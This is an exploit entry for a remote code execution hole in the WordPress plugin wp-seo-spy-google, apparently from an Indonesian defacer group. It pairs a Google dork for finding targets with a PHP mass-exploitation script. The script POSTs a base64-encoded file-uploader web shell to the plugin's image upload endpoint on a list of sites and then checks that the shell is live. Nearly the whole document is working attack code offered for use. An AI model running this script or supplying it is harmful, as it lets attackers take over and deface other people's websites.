# Exploit Title: WordPress plugins wp-seo-spy-google Remote Code Execution
# Google Dork: inurl:/wp-content/plugins/wp-seo-spy-google/
# Exploit Author: Index Php
# Tested on: Windows, PHP 5.2
#
#######################################################

#exploit
<form method=&#039;POST&#039;>
<input type=&#039;text&#039; name=&#039;name&#039; value=&#039;ina.php&#039;>
<input type=&#039;submit&#039; value=&#039;Hajar&#039; name=&#039;hajar&#039;><br>
<textarea name=&#039;situs&#039; cols=&#039;45&#039; rows=&#039;15&#039;>http://target.com/</textarea>
</form>
<?
	@set_time_limit(0);
	$site = explode("\r\n", $_POST[&#039;situs&#039;]);
	$namafile = $_POST[&#039;name&#039;];
	$path = array(&#039;/wp-content/plugins/wp-seo-spy-google/ofc/php-ofc-library/ofc_upload_image.php&#039;);
	
	$nama = array("/wp-content/plugins/wp-seo-spy-google/ofc/tmp-upload-images/");
	
	$uploader = base64_decode("PD9waHANCmVjaG8gJzx0aXRsZT5VcGxvYWQgRmlsZXMgSW5kb25lc2lhbiBEZWZhY2VyIHwgaW5hLnBocDwvdGl0bGU+JzsNCmVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JzsNCmlmKCAkX1BPU1RbJ191cGwnXSA9PSAiVXBsb2FkIiApIHsNCglpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8Yj5VcGxvYWQgQmVyaGFzaWwgISEhPC9iPjxicj48YnI+JzsgfQ0KCWVsc2UgeyBlY2hvICc8Yj5VcGxvYWQgR2FnYWwgISEhPC9iPjxicj48YnI+JzsgfQ0KfQ0KPz4=");
	
	$options = array(&#039;http&#039; => array(&#039;method&#039;=> "POST",&#039;header&#039;=> "Content-type: text/plain\r\n", &#039;content&#039;=> $uploader));
	$context = stream_context_create($options);
	
	if($_POST[&#039;hajar&#039;])
	{
		foreach($site as $situs)
		{
			foreach($path as $upload)
			{
				$fopen = @fopen("{$situs}{$upload}?name={$namafile}", &#039;r&#039;, false, $context);
			}
			foreach($nama as $namas)
			{
				$url = "{$situs}{$namas}{$namafile}";
				$check = @file_get_contents($url);
				if(eregi("ina.php", $check))
				{
					echo "<font face=&#039;Tahoma&#039; size=&#039;2&#039;>[+] Exploit Sukses => {$situs}/{$namas}/{$namafile} <br />";
					flush();
				}
			}
		}
	}
	echo "<font face=&#039;Tahoma&#039; size=&#039;2&#039;>[+] Greetz all Indonesian Defacer</font>";
?>

